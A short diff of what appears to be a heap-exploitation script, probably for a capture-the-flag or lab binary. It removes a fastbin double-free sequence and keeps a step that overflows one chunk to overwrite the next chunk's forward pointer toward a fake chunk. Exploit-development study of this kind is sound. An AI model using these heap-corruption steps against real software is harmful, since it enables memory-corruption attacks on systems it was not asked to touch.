@@ -57,12 +57,6 @@ malloc(2, 0x60)  # chunk B
 # fastbin -> B
 free(2)
 
-# fastbin -> A -> B
-free(1)
-
-# fastbin -> B -> A -> B -> A -> ...
-free(2)
-
 # Overflow A to overwrite B's fd pointer
 # fastbin -> B -> fake
 
